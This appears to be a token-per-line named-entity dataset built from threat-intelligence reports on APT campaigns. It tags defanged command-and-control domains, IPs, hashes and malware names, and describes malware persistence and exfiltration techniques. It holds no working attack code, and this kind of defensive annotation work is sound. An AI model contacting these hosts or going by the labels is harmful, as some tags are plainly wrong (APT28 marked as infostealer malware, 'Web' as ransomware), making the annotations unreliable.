obfuscated	O
HTML	O
comments	O
to	O
hide	O
their	O
C	O
&	O
C	O
transactions	O
.	O

Table	O
1	O
-	O
url	O
and	O
paths	O
discovered	O

This	O
information	O
is	O
scheduled	O
for	O
collection	O
and	O
exfi	O
ltration	O
every	O
week	O
at	O
3	O
AM	O
.	O

After	O
the	O
execution	O
of	O
accevent.exe	O
,	O
it	O
loads	O
event.dll	O
,	O
which	O
will	O
be	O
placed	O
in	O
the	O
same	O
folder	O
(	O
so	O
it	O
takes	O
loading	O
priority	O
)	O
,	O
after	O
which	O
event.dll	O
decrypts	O
and	O
loads	O
the	O
encrypted	O
backdoor	O

The	O
malware	O
constructs	O
a	O
1120	O
bit	O
public	O
key	O
,	O
uses	O
it	O
to	O
encrypt	O
the	O
117-bytes	O
buffer	O
.	O

blaaaaaaaaaaaa.windowsupdate(.)3-a.net	B-url.unknown
contract.4mydomain(.)com	B-url.unknown
contractus.qpoe(.)com	B-url.unknown
ctdl.windowsupdate.itsaol(.)com	B-url.unknown
ctldl.microsoftupdate.qhigh(.)com	B-url.unknown
ctldl.windowsupdate.authorizeddns(.)org	B-url.unknown
ctldl.windowsupdate.authorizeddns(.)us	B-url.unknown
ctldl.windowsupdate.dnset(.)com	B-url.unknown
ctldl.windowsupdate.lflinkup(.)com	B-url.unknown
ctldl.windowsupdate.x24hr(.)com	B-url.unknown
download.windowsupdate.authorizeddns(.)org	B-url.unknown
download.windowsupdate.dnset(.)com	B-url.unknown
download.windowsupdate.itsaol(.)com	B-url.unknown
download.windowsupdate.lflinkup(.)com	B-url.unknown
download.windowsupdate.x24hr(.)com	B-url.unknown
ea.onmypc(.)info	B-url.unknown
eu.wha(.)la	B-url.unknown
feed.jungleheart(.)com	B-url.unknown
fire.mrface(.)com	B-url.unknown
fuck.ikwb(.)com	B-url.unknown
globalnews.wikaba(.)com	B-url.unknown
helpus.ddns(.)info	B-url.unknown
home.trickip(.)org	B-url.unknown
imap.dnset(.)com	B-url.unknown
ipv4.windowsupdate.3-a(.)net	B-url.unknown
ipv4.windowsupdate.authorizeddns(.)org	B-url.unknown
ipv4.windowsupdate.dnset(.)com	B-url.unknown
ipv4.windowsupdate.fartit(.)com	B-url.unknown
ipv4.windowsupdate.lflink(.)com	B-url.unknown
ipv4.windowsupdate.lflinkup(.)com	B-url.unknown
ipv4.windowsupdate.mylftv(.)com	B-url.unknown
ipv4.windowsupdate.x24hr(.)com	B-url.unknown
latestnews.organiccrap(.)com	B-url.unknown
microsoftmirror.mrbasic(.)com	B-url.unknown
microsoftmusic.itemdb(.)com	B-url.unknown
microsoftstore.onmypc(.)net	B-url.unknown
microsoftupdate.qhigh(.)com	B-url.unknown
mobile.2waky(.)com	B-url.unknown
mseupdate.ourhobby(.)com	B-url.unknown
newsreport.justdied(.)com	B-url.unknown
nmrx.mrbonus(.)com	B-url.unknown
outlook.otzo(.)com	B-url.unknown
referred.gr8domain(.)biz	B-url.unknown
twx.mynumber(.)org	B-url.unknown
v4.windowsupdate.authorizeddns(.)org	B-url.unknown
v4.windowsupdate.dnset(.)com	B-url.unknown
v4.windowsupdate.itsaol(.)com	B-url.unknown
v4.windowsupdate.lflinkup(.)com	B-url.unknown
v4.windowsupdate.x24hr(.)com	B-url.unknown
visualstudio.authorizeddns(.)net	B-url.unknown
windowsupdate.2waky(.)com	B-url.unknown
windowsupdate.3-a(.)net	B-url.unknown
windowsupdate.acmetoy(.)com	B-url.unknown
windowsupdate.authorizeddns(.)net	B-url.unknown
windowsupdate.authorizeddns(.)org	B-url.unknown
windowsupdate.dns05(.)com	B-url.unknown
windowsupdate.dnset(.)com	B-url.unknown
windowsupdate.esmtp(.)biz	B-url.unknown
windowsupdate.ezua(.)com	B-url.unknown
windowsupdate.fartit(.)com	B-url.unknown
windowsupdate.itsaol(.)com	B-url.unknown
windowsupdate.lflink(.)com	B-url.unknown
windowsupdate.mrface(.)com	B-url.unknown
windowsupdate.mylftv(.)com	B-url.unknown
windowsupdate.x24hr(.)com	B-url.unknown
www.contractus.qpoe(.)com	B-url.unknown
www.feed.jungleheart(.)com	B-url.unknown
www.helpus.ddns(.)info	B-url.unknown
www.latestnews.organiccrap(.)com	B-url.unknown
www.microsoftmirror.mrbasic(.)com	B-url.unknown
www.microsoftmusic.itemdb(.)com	B-url.unknown
www.microsoftstore.onmypc(.)net	B-url.unknown
www.mobile.2waky(.)com	B-url.unknown
www.mseupdate.ourhobby(.)com	B-url.unknown
www.nmrx.mrbonus(.)com	B-url.unknown
www.twx.mynumber(.)org	B-url.unknown
www.visualstudio.authorizeddns(.)net	B-url.unknown
www.windowsupdate.acmetoy(.)com	B-url.unknown
www.windowsupdate.authorizeddns(.)net	B-url.unknown
www.windowsupdate.authorizeddns(.)org	B-url.unknown
www.windowsupdate.dnset(.)com	B-url.unknown
www.windowsupdate.itsaol(.)com	B-url.unknown
www.windowsupdate.x24hr(.)com	B-url.unknown
www2.qpoe(.)com	B-url.unknown
www2.zyns(.)com	B-url.unknown
www2.zzux(.)com	B-url.unknown
The	O
Snake	O
Wine	O
group	O
has	O
proven	O
to	O
be	O
highly	O
adaptable	O
and	O
has	O
continued	O
to	O
adopt	O
new	O
tactics	O
in	O
order	O
to	O
establish	O
footholds	O
inside	O
victim	O
environments	O
.	O

5a31342e8e33e2bbe17f182f2f2b508edb20933f	B-hash
23c466c465ad09f0ebeca007121f73e5b630ecf6	I-hash
14FDEF1F5469EB7B67EB9186AA0C30AFAF77A07C	I-hash

Format	O
String	O

Related	O
MD5	O
:	O

All	O
materials	O
are	O
intended	O
for	O
the	O
original	O
recipient	O
only	O
.	O

15	O

SUBMIT	O
©	O
2018	O
AO	O
Kaspe	O
rsky	O
Lab	O
.	O

It	O
attempts	O
to	O
retrieve	O
the	O
SWIFT	O
unique	O
message	O
ID	O
(	O
MESG_S_UMID	O
)	O
that	O
corresponds	O
to	O
the	O
transfer	O
reference	O
and	O
sender	O
address	O
retrieved	O
earlier	O
:	O

Figure	O
21	O
:	O
Host	O
Recon	O
Data	O
Sent	O
to	O
Second	O
C2	O
Server	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

Fig	O
.	O

idsagroup[.]i	B-url.unknown
n	I-url.unknown
)	O
which	O
also	O
impersonates	O
the	O
identity	O
of	O
IDSA	O
.	O

Permissions	O
,	O
Privileges	O
,	O
and	O
Access	O
Controls	O

Carefully	O
selected	O
group	O
of	O
employees	O
received	O
spear-phishing	O
emails	O
,	O
containing	O
either	O
links	O
to	O
malicious	O
sites	O
or	O
weaponized	O
Word	O
documents	O
.	O

The	O
malware	O
communicated	O
on	O
the	O
TCP	O
port	O
2020	O
,	O
but	O
it	O
is	O
also	O
worth	O
mentioning	O
that	O
there	O
was	O
also	O
a	O
C	O
&	O
C	O
console	O
running	O
on	O
port	O
443	O
with	O
a	O
familiar	O
certificate	O
subject	O
common	O
name	O
-	O
.	O

Software	O
Vulnerability	O
Information	O
Reputation	O
Center	O
Library	O
Support	O
Communities	O
About	O
Careers	O
Blog	O

Thanks	O
for	O
reading	O
.	O

The	O
links	O
between	O
the	O
forums	O
and	O
contractors	O
may	O
illustrate	O
that	O
the	O
trust	O
communities	O
begin	O
with	O
the	O
Iranian	O
security	O
forums	O
.	O

Tiberius	O
Axinte	O
,	O
Technical	O
Lead	O
,	O
Antimalware	O
Lab	O
Bogdan	O
Botezatu	O
-	O
senior	O
e-threat	O
analyst	O

An	O
investigation	O
by	O
the	O
Swiss	O
federal	O
police	O
of	O
some	O
of	O
the	O
emails	O
linked	O
to	O
Operation	B-malware.ransom
Manul	I-malware.ransom
concludes	O
that	O
they	O
were	O
sent	O
from	O
IP	O
addresses	O
in	O
India	O
,	O
which	O
also	O
suggests	O
a	O
link	O
to	O
Appin	O
.	O

Coverage	O
for	O
associated	O
malware	O
was	O
released	O
January	O
15	O
(	O
as	O
'	O
BehavesLike.JS.Obfuscated.E	O
'	O
)	O
.	O

It	O
's	O
interesting	O
that	O
the	O
drop	O
box	O
mail	O
accounts	O
iop110112@hotmail.com	O
and	O
rsh1213@hotmail.com	O
are	O
registered	O
with	O
the	O
following	O
'	O
kim	O
'	O
names	O
:	O
kimsukyang	O
and	O
'	O
Kim	O
asdfa	O
'	O
.	O

Since	O
2009	O
,	O
Iran	O
has	O
developed	O
proxies	O
in	O
the	O
cyber	O
domain	O
to	O
partially	O
obfuscate	O
government	O
fingerprints	O
from	O
foreign	O
attacks	O
.	O

Cobalt	O
Strike	O
has	O
the	O
following	O
characteristics	O
:	O
With	O
an	O
automated	O
test	O
platform	O
Cobalt	O
Strike	O
,	O
the	O
attack	O
penetration	O
can	O
penetrate	O
firewall	O
,	O
the	O
approach	O
the	O
attackers	O
used	O
to	O
control	O
targeted	O
host	O
is	O
covert	O
and	O
undetectable	O
;	O
what	O
's	O
more	O
,	O
it	O
can	O
attack	O
various	O
platforms	O
,	O
such	O
as	O
Windows	O
,	O
Linux	O
,	O
Mac	O
etc	O
.	O

In	O
2012	O
,	O
XtremeRAT	B-malware.backdoor
was	O
used	O
against	O
a	O
variety	O
of	O
governments	O
as	O
well	O
as	O
Israeli	O
and	O
Palestinian	O
targets	O
in	O
what	O
was	O
known	O
as	O
Operation	O
Molerats	O
(	O
the	O
same	O
attackers	O
have	O
also	O
used	O
variants	O
of	O
the	O
Poison	O
Ivy	O
RAT	O
)	O
.	O

netsat.exe	B-malware.infosteal
The	O
following	O
interesting	O
strings	O
were	O
noted	O
in	O
the	O
raw	O
netsat.exe	B-malware.infosteal
file	O
:	O
VMProtect	O
begin	O
VMProtect	O
end	O
!	O

Perhaps	O
the	O
most	O
unusual	O
fact	O
was	O
that	O
the	O
Microsoft	O
Office	O
exploit	O
did	O
n't	O
directly	O
write	O
a	O
Windows	O
PE	O
backdoor	O
on	O
disk	O
.	O

This	O
executable	O
imports	O
the	O
rastls.dll	O
file	O
,	O
which	O
in	O
this	O
case	O
contains	O
the	O
malicious	O
payload	O
.	O

The	O
values	O
of	O
the	O
Eip	O
and	O
Esp	O
in	O
the	O
actual	O
runtime	O
CONTEXT	O
and	O
the	O
attacker	O
's	O
intention	O
are	O
shown	O
in	O
the	O
figure	O
below	O
.	O

Non-governmental	O
political	O
organizations	O
may	O
provide	O
access	O
to	O
desirable	O
national	O
policy	O
information	O
,	O
especially	O
foreign	O
policy	O
,	O
but	O
may	O
not	O
have	O
the	O
same	O
level	O
of	O
protection	O
and	O
security	O
as	O
governmental	O
organizations	O
.	O

chat-messenger.site	O
(	O
185.8.237.151	B-ip.unknown
)	O
,	O
operated	O
until	O
spring	O
2017	O
and	O
was	O
a	O
very	O
convincing	O
copycat	O
.	O

Sofacy	O
is	O
such	O
a	O
large	O
,	O
active	O
group	O
that	O
appears	O
to	O
maintain	O
multiple	O
subgroups	O
and	O
efforts	O
that	O
all	O
fit	O
under	O
the	O
Sofacy	O
'	O
umbrella	O
'	O
.	O

Koadic	B-malware.unknown
sends	O
its	O
own	O
JavaScript	O
code	O
as	O
plain	O
text	O
.	O

•	O
Usage	O
of	O
HTRAN	O
to	O
proxy	O
their	O
command	O
and	O
control	O
communication	O
.	O

Outside	O
of	O
the	O
Middle	O
East	O
,	O
Symantec	O
has	O
also	O
found	O
evidence	O
of	O
attacks	O
against	O
one	O
African	O
airline	O
and	O
attempts	O
to	O
compromise	O
an	O
international	O
travel	O
reservations	O
 rm	O
.	O

Internally	O
,	O
the	O
code	O
of	O
this	O
DLL	O
loads	O
a	O
2nd	O
stage	O
library	O
called	O
binaryreader.Exploit	O
–	O
as	O
seen	O
below	O
with	O
the	O
XOR-encoded	O
string	O
:	O

APT28	B-malware.infosteal
IS	O
IN	O
YOUR	O
NETWORK	O
.	O

[	O
그림	O
12	O
]	O
중국어	O
및	O
한국어	O
콘트롤러	O
Rifdoor는	B-malware.backdoor
2015년	O
11월에	O
처음	O
발견되었으며	O
,	O
2016년	O
초까지	O
활동이	O
확인되었다	O
.	O

p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX	O
EJ7OZkvwBZVx1JsrhQ==	O
HTTP/1.1	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Win32	O
)	O
Host	O
:	O
192.168.2.26	B-ip.unknown

TOOL	O
ROLE	O
AK	O
A	O

However	O
,	O
the	O
story	O
is	O
interesting	O
not	O
only	O
because	O
of	O
the	O
large	O
amount	O
of	O
money	O
stolen	O
but	O
also	O
from	O
a	O
technical	O
point	O
of	O
view	O
.	O

(	O
https://securingtomorrow.mcafee.com/	B-url.normal
)	O
By	O
Ryan	O
Sherstobito 	O
(	O
https://securingtomorrow.mcafee.com/author/ryan-sherstobito /	B-url.normal
)	O
and	O
Jessica	O
Saavedra-Morales	O
(	O
https://securingtomorrow.mcafee.com/author/jessica-saavedra-morales/	B-url.normal
)	O
on	O
Jan	O
06	O
,	O
2018	O
(	O
https://securingtomorrow.mcafee.com/2018/01/	B-url.normal
)	O
McAfee	O
Advanced	O
Threat	O
Research	O
analysts	O
have	O
discovered	O
a	O
campaign	O
targeting	O
organizations	O
involved	O
with	O
the	O
Pyeongchang	O
Olympics	O
.	O

When	O
executed	O
,	O
the	O
winsocks.exe	B-malware.backdoor
backdoor	O
requests	O
a	O
PHP	O
update	O
callback	O
at	O
http[:]//199.91.173[.]43/fetch_updates_8765.php?compname=	B-ip.unknown
<	O
COMPUTERNAME	O
>	O
.	O

25502	O
2010	O
Different	O
03.11	O
.	O

application	O
to	O
view	O
mail	O
and	O
gives	O
access	O
.	O

In	O
this	O
blog	O
post	O
we	O
dissect	O
two	O
of	O
the	O
main	O
campaigns	O
and	O
explain	O
how	O
they	O
work	O
.	O

All	O
materials	O
are	O
intended	O
for	O
the	O
original	O
recipient	O
only	O
.	O

Another	O
peculiarity	O
,	O
is	O
the	O
name	O
of	O
the	O
function	O
where	O
is	O
present	O
the	O
code	O
for	O
the	O
HTTPS	O
communication	O
.	O

We	O
assist	O
and	O
coach	O
the	O
organization	O
to	O
formulate	O
and	O
implement	O
a	O
cyber-event	O
handling	O
program	O
and	O
crisis	O
level	O
situation	O
assessment	O
and	O
decision	O
making.info@clearskysec.com	O
http://www.clearskysec.com	B-url.normal
Minerva	O
offers	O
a	O
low	O
footprint	O
endpoint	O
protection	O
platform	O
.	O

Dark	B-malware.backdoor
Comet	I-malware.backdoor
version	O

Of	O
course	O
,	O
this	O
information	O
can	O
be	O
manipulated	O
by	O
the	O
malware	O
author	O
.	O

Most	O
recently	O
,	O
FireEye	O
observed	O
HIGHTIDE	B-malware.backdoor
at	O
multiple	O
Taiwan-based	O
organizations	O
and	O
the	O
suspected	O
APT12	O
WATERSPOUT	B-malware.backdoor
backdoor	O
at	O
a	O
Japan-based	O
electronics	O
company	O
.	O

Such	O
information	O
can	O
be	O
used	O
to	O
manipulate	O
a	O
victim	O
or	O
even	O
use	O
it	O
for	O
blackmail	O
or	O
bribery	O
.	O

A	O
200.63.46.23	B-ip.unknown
2	O
www.dvdform.com	B-url.unknown
.	O

POST	O

During	O
our	O
investigation	O
we	O
spotted	O
three	O
instances	O
of	O
the	O
renewed	O
operation	O
,	O
but	O
unique	O
artifacts	O
in	O
the	O
command	O
and	O
control	O
website	O
revealed	O
a	O
wider	O
infrastructure	O
that	O
may	O
well	O
manage	O
more	O
unknown	O
samples	O
.	O

Recently	O
,	O
the	O
Darkhotel	B-malware.infosteal
APT	O
has	O
maintained	O
multiple	O
working	O
directories	O
on	O
this	O
site	O
.	O

In	O
our	O
analysed	O
sample	O
the	O
'	O
Loveusd.sys	O
'	O
driver	O
is	O
installed	O
with	O
the	O
name	O
'	O
USBHPMS	O
'	O
.	O

Symantec	O
has	O
seen	O
Chafer	O
use	O
seven	O
new	O
tools	O
in	O
its	O
more	O
recent	O
campaigns	O
,	O
in	O
addition	O
to	O
malware	O
it	O
is	O
previously	O
known	O
to	O
have	O
used	O
.	O

[	O
그림	O
17	O
]	O
Andaratm	B-malware.backdoor
악성코드의	O
특징적인	O
문자열	O
Andaratm가	B-malware.backdoor
실행되면	O
컴퓨터	O
이름과	O
사용자	O
이름	O
등의	O
정보를	O
획득하며	O
,	O
지정된	O
C2	O
서버로	O
접속을	O
시도하	O
고	O
명령을	O
받아	O
수행한다	O
.	O

These	O
include	O
remote	O
desktop	O
,	O
webcam	O
spying	O
,	O
remote	O
shell	O
,	O
and	O
file	O
management	O
.	O

Unit	O
42	O
used	O
the	O
Palo	O
Alto	O
Networks	O
AutoFocus	O
threat	O
intelligence	O
service	O
to	O
locate	O
additional	O
samples	O
using	O
the	O
'	O
cgl-bin	O
'	O
string	O
within	O
URLs	O
of	O
HTTP	O
requests	O
and	O
found	O
several	O
samples	O
of	O
the	O
Cmwhite	B-malware.unknown
tool	O
associated	O
with	O
the	O
LURID/Enfal	B-malware.unknown
downloader	O
,	O
as	O
seen	O
in	O
Figure	O
2	O
.	O

File	O
name	O
SHA-1	O
hash	O

download-mgrwin[.]com	B-url.cncsvr
was	O
registered	O
on	O
the	O
email	O
address	O
info@communication-principals[.]com	B-url.unknown
,	O
purportedly	O
belonging	O
to	O
one	O
Nick	O
Agroyes	O
:	O
This	O
is	O
a	O
faked	O
record	O
,	O
but	O
the	O
same	O
address	O
was	O
used	O
to	O
register	O
other	O
domains	O
of	O
which	O
some	O
have	O
been	O
documented	O
used	O
by	O
malware	O
-	O
alertmymailsnotify[.]com	B-url.unknown
,	O
communication-principals[.]com	B-url.unknown
,	O
servicesprocessing[.]com	B-url.unknown
and	O
websourceing[.]com	B-url.unknown
.	O

While	O
this	O
shared	O
resource	O
is	O
noteworthy	O
,	O
of	O
particular	O
interest	O
is	O
that	O
it	O
has	O
also	O
been	O
used	O
in	O
other	O
campaigns	O
.	O

Trend	O
Micro	O
discovered	O
the	O
ChessMaster	O
campaign	O
back	O
in	O
July	O
2017	O
as	O
part	O
of	O
our	O
monitoring	O
efforts	O
to	O
protect	O
our	O
customers	O
.	O

SFX	O
settings	O
inside	O
malicious	O
archive	O
Figure	O
3	O
.	O

Stay	O
tuned	O
for	O
Parts	O
2-4	O
as	O
we	O
cover	O
File	O
Stacking	O
,	O
Web	O
Log	O
Review	O
,	O
and	O
Network	O
Detection	O
.	O

This	O
campaign	O
is	O
of	O
note	O
since	O
the	O
malware	O
goes	O
to	O
great	O
lengths	O
to	O
replace	O
specific	O
mobile	O
apps	O
for	O
data	O
interception	O
.	O

The	O
attackers	O
also	O
introduced	O
a	O
very	O
rare	O
and	O
stealthy	O
technique	O
to	O
communicate	O
with	O
their	O
servers	O
and	O
exfiltrate	O
data	O
using	O
Microsoft	O
Outlook	O
.	O

APT-TOCS	B-malware.infosteal
used	O
'	O
powershell.exe	B-malware.drop
'	O
to	O
execute	O
Shellcode	O
scripts	O
to	O
realize	O
remote	O
control	O
on	O
targeted	O
system	O
.	O

Notice	O
the	O
combination	O
of	O
India	O
and	O
China	O
references	O
here	O
.	O

We	O
immediately	O
recognized	O
the	O
email	O
as	O
a	O
fake	O
–	O
coming	O
from	O
an	O
unofficial	O
address	O
-	O
idf.cyber@gmail.com	B-url.unknown
–	O
and	O
written	O
in	O
English	O
.	O

It	O
then	O
creates	O
a	O
hidden	O
console	O
window	O
and	O
registers	O
its	O
only	O
export	O
_LowLevelKeyboardProc	O
@	O
12	O
as	O
a	O
hook	O
procedure	O
for	O
low-level	O
keyboard	O
input	O
events	O
(	O
WH_KEYBOARD_LL	O
hook	O
)	O
.	O

We	O
assume	O
that	O
the	O
actor	O
behind	O
these	O
campaigns	O
uses	O
several	O
different	O
malware	O
strains	O
is	O
order	O
to	O
compromise	O
the	O
targeted	O
infrastructure	O
:	O
Uroburos	B-malware.backdoor
,	O
a	O
rootkit	O
;	O
Agent.BTZ/ComRAT	B-malware.backdoor
,	O
remote	O
administration	B-malware.backdoor
tools	I-malware.backdoor
or	O
Linux	O
malware	O
and	O
maybe	O
even	O
more	O
.	O

This	O
VPS	O
also	O
hosts	O
over	O
2,000	O
other	O
domains	O
,	O
most	O
of	O
which	O
are	O
.ir	O
domains	O
.	O

Decoy	O
document	O
with	O
personal	O
information	O
about	O
military	O
personnel	O

This	O
script	O
called	O
'	O
up.bat	O
'	O
sits	O
in	O
the	O
temporary	O
folder	O
and	O
serves	O
four	O
main	O
purposes	O
:	O
It	O
renames	O
the	O
second	O
batch	O
script	O
from	O
tnew.bat	O
to	O
win32shell.bat	O
;	O
Assigns	O
system	O
fi	O
le	O
attributes	O
to	O
it	O
;	O
Modifi	O
es	O
its	O
Access	O
Control	O
List	O
(	O
ACL	O
)	O
to	O
be	O
easily	O
controlled	O
;	O
as	O
well	O
as	O
legit	O
security	O
solutions	O
like	O
360.	O
;	O
Kills	O
all	O
scheduled	O
tasks	O
that	O
might	O
interfere	O
with	O
the	O
sample	O
.	O

This	O
is	O
done	O
in	O
order	O
to	O
get	O
only	O
one	O
report	O
per	O
infected	O
host	O
.	O

It	O
was	O
Respublika	O
's	O

In	O
November	O
2014	O
,	O
the	O
experts	O
of	O
the	O
G	O
DATA	O
SecurityLabs	O
published	O
an	O
article	O
about	O
ComRAT	B-malware.backdoor
,	O
the	O
Agent.BTZ	B-malware.backdoor
successor	O
.	O

Description	O

At	O
the	O
same	O
time	O
,	O
there	O
is	O
a	O
separate	O
configuration	O
file	O
for	O
the	O
whole	O
malicious	O
complex	O
and	O
an	O
encrypted	O
block	O
in	O
the	O
system	O
registry	O
that	O
defines	O
the	O
location	O
of	O
the	O
module	O
being	O
loaded	O
and	O
name	O
of	O
the	O
process	O
for	O
injection	O
.	O

The	O
other	O
is	O
an	O
e-mail	O
attachment	O
calling	O
for	O
jihad	O
against	O
Hezbollah	O
and	O
the	O
Assad	O
regime	O
or	O
promising	O
interesting	O
regional	O
news	O
.	O

It	O
appears	O
that	O
the	O
latest	O
version	O
of	O
this	O
RAT	B-malware.infosteal
is	O
3.2	O
and	O
is	O
being	O
sold	O
at	O
'	O
unrecom[.]net	B-url.cncsvr
'	O
for	O
$	O
500	O
(	O
Enterprise	O
Version	O
)	O
and	O
$	O
200	O
(	O
Full	O
Version	O
)	O
.	O

Written	O
by	O
FireEye	O
researcher	O
Mike	O
Spohn	O
,	O
mftdump	O
is	O
a	O
great	O
tool	O
for	O
extracting	O
and	O
analyzing	O
file	O
metadata	O
.	O

We	O
assume	O
that	O
the	O
performed	O
COM	O
object	O
hijacking	O
generates	O
some	O
trouble	O
on	O
the	O
infected	O
system	O
,	O
that	O
's	O
why	O
the	O
author	O
changed	O
related	O
things	O
in	O
the	O
next	O
version	O
.	O

<	O
O.N.Mishin@chelindbank[.]ru	O
>	O

For	O
the	O
Babar	B-malware.drop
project	O
though	O
the	O
attackers	O
used	O
an	O
adapted	O
version	O
of	O
SHA-1	O
,	O
as	O
opposed	O
to	O
the	O
simple	O
XOR/ROL	O
hash	O
algorithm	O
which	O
was	O
used	O
in	O
the	O
Bunny	B-malware.unknown
project	O
.	O

This	O
family	O
of	O
backdoors	O
(	O
aka	O
HTTP	O
Tunnel	O
)	O
is	O
Chinese	O
in	O
origin	O
and	O
was	O
used	O
in	O
attacks	O
against	O
Asian	O
government	O
organizations	O
.	O

This	O
is	O
not	O
a	O
problem	O
though	O
,	O
because	O
it	O
can	O
be	O
easily	O
decoded	O
.	O

Cyberkov	O
tried	O
to	O
discover	O
the	O
attacker	O
behind	O
this	O
malicious	O
application	O
by	O
sinkholing	O
the	O
malware	O
and	O
analyzing	O
the	O
real	O
C2	O
.	O

The	O
file	O
was	O
requested	O
from	O
IP	O
addresses	O
throughout	O
Asia	O
without	O
ever	O
returning	O
valid	O
content	O
.	O

Yes	O
that	O
's	O
not	O
a	O
misspelling	O
Word	O
is	O
happy	O
to	O
open	O
this	O
RTF	O
format	O
as	O
well	O
.	O

This	O
is	O
very	O
similar	O
to	O
the	O
method	O
described	O
by	O
FireEye	O
in	O
their	O
blog	O
on	O
Operation	O
Poisoned	O
Hurricane	O
.	O

feedback	O
:	O
openy0urm1nd	O
[	O
@	O
]	O
protonmail.ch	O

http://news.joins.com/article/19706272	O
http://www.yonhapnews.co.kr/northkorea/2016/06/13/1801000000AKR20160613092851004.HTML	O
http://www.etnews.com/20161001000007	O
http://news.khan.co.kr/kh_news/khan_art_view.html?artid=201709061203001&code=940100	O
http://news.chosun.com/site/data/html_dir/2017/10/17/2017101703770.html	O
http://www.ddaily.co.kr/news/article.html?no=164197	O

Once	O
the	O
named	O
pipe	O
has	O
been	O
created	O
,	O
CreateProcessAsUserA	O
is	O
called	O
with	O
the	O
following	O
as	O
the	O
CommandLine	O
parameter	O
:	O

At	O
the	O
time	O
of	O
this	O
writing	O
,	O
the	O
People	O
Power	O
website	O
is	O
still	O
serving	O
up	O
malicious	O
code	O
.	O

5	O
.	O

Backups	O
:	O
Do	O
we	O
backup	O
all	O
critical	O
information	O
?	O

Well	O
known	O
applications	O
supporting	O
end-to-end	O
encryption	O
are	O
used	O
by	O
hundreds	O
of	O
millions	O
of	O
folks	O
,	O
sometimes	O
unknowingly	O
,	O
every	O
day	O
.	O

The	O
email	O
message	O
and	O
the	O
lure	O
documents	O
are	O
written	O
in	O
Hebrew	O
,	O
Arabic	O
or	O
English	O
.	O

It	O
happens	O
to	O
be	O
an	O
instance	O
of	O
DarkComet	B-malware.backdoor
Version	O
4.2	O
;	O
however	O
,	O
the	O
results	O
presented	O
here	O
apply	O
to	O
most	O
other	O
versions	O
of	O
DarkComet	B-malware.backdoor
as	O
well	O
.	O

2016	O
.	O

These	O
documents	O
were	O
Excel	O
spreadsheets	O
.	O

While	O
this	O
is	O
a	O
trivial	O
persistence	O
method	O
,	O
the	O
malware	O
Payload	O
DLL	O
has	O
the	O
ability	O
to	O
reference	O
this	O
registry	O
key	O
during	O
the	O
un-install	O
routine	O
,	O
which	O
will	O
be	O
described	O
later	O
.	O

Set	O
the	O
filename	O
to	O
be	O
deleted	O
or	O
created	O
(	O
depends	O
on	O
other	O
parameters	O
)	O

isActiveNetwork	O
]	O

The	O
following	O
command	O
file	O
hex	O
editor	O
excerpt	O
illustrates	O
the	O
command	O
file	O
's	O
obfuscation	O
in	O
a	O
contrived	O
instance	O
:	O
Offset	O
0123456789	O
10	O
11	O
12	O
13	O
14	O
15	O
00000000	O
00000016	O
BB	O
6D	O
E4	O
40	O
60	O
34	O
CC	O
6A	O
0A	O
B7	O
2A	O
'	O
mä	O
@	O
'	O
4Ìj	O
·*	O

Exploit	O
Document	O
Filename	O
:	O

All	O
rights	O
reserved	O
.	O

Several	O
days	O
later	O
,	O
Inception	B-malware.backdoor
will	O
send	O
a	O
second	O
spear-phishing	O
email	O
to	O
the	O
target	O
,	O
with	O
another	O
malicious	O
document	O
attached	O
.	O

Figure	O
7	O
:	O
Screenshot	O
of	O
the	O
CnC	O
client	O
showing	O
capabilities	O
of	O
the	O
Web	B-malware.ransom
shell	O

The	O
malicious	O
document	O
was	O
submitted	O
from	O
South	O
Korea	O
to	O
Virus	O
Total	O
on	O
December	O
29	O
at	O
09:04	O
,	O
a	O
day	O
after	O
the	O
original	O
email	O
was	O
sent	O
to	O
the	O
target	O
list	O
.	O

The	O
readings	O
are	O
encrypted	O
using	O
an	O
RSA	O
public	O
key	O
found	O
in	O
memory	O
(	O
whose	O
modulus	O
begins	O
with	O
A25A944E	O
)	O
and	O
written	O
to	O
the	O
.dat	O
file	O
before	O
any	O
other	O
encrypted	O
data	O
.	O

After	O
searching	O
through	O
the	O
drive	O
we	O
found	O
that	O
there	O
were	O
three	O
VBRs	O
that	O
all	O
seemed	O
to	O
have	O
corresponding	O
information	O
for	O
the	O
partitions	O
that	O
were	O
originally	O
created	O
.	O

It	O
accesses	O
C	O
&	O
C	O
via	O
WebDAV	O
hosted	O
on	O
legitimate	O
cloud	O
storage	O
providers	O
.	O

In	O
the	O
process	O
of	O
analyzing	O
infected	O
servers	O
,	O
numerous	O
websites	O
and	O
servers	O
were	O
identified	O
that	O
the	O
attackers	O
had	O
scanned	O
with	O
various	O
tools	O
,	O
such	O
as	O
nmap	O
,	O
dirsearch	O
,	O
sqlmap	O
,	O
etc	O
.	O

系统研究	O
(	O
1	O
)	O

These	O
appear	O
to	O
have	O
been	O
prepared	O
for	O
email	O
distribution	O
or	O
possibly	O
for	O
web	O
download	O
.	O

Bunny	B-malware.unknown
,	O
a	O
Lua­based	O
backdoor	O
,	O
documented	O
by	O
Marion	O
Marschalek	O
(	O
Cyphort	O
)	O

Perhaps	O
because	O
many	O
of	O
these	O
campaigns	O
were	O
designed	O
to	O
run	O
on	O
specific	O
machines	O
,	O
using	O
English	O
and	O
Portuguese	O
languages	O
,	O
with	O
diverse	O
command	O
and	O
control	O
servers	O
located	O
in	O
different	O
countries	O
and	O
soon	O
discarded	O
,	O
signing	O
malware	O
with	O
different	O
certificates	O
issued	O
in	O
the	O
name	O
of	O
rogue	O
companies	O
,	O
and	O
so	O
on	O
.	O

Following	O
are	O
traces	O
collected	O
from	O
passive	O
DNS	O
data	O
relevant	O
to	O
the	O
hosts	O
involved	O
in	O
these	O
attacks	O
:	O

2016년	O
6월	O
,	O
경찰은	O
중앙관리	O
솔루션의	O
취약점을	O
이용한	O
방위산업	O
관련	O
대기	O
업	O
해킹	O
,	O
일명	O
'	O
유령	O
쥐	O
작전	O
(	O
Operation	B-malware.drop
Ghost	I-malware.drop
Rat	I-malware.drop
)	O
'	O
을	O
공개했다	O
.	O

We	O
dug	O
deeper	O
into	O
our	O
archives	O
and	O
found	O
APKs	O
belonging	O
to	O
several	O
fake	O
messenger	O
and	O
feed	O
reader	O
apps	O
,	O
all	O
of	O
which	O
included	O
the	O
same	O
malicious	O
modules	O
.	O

This	O
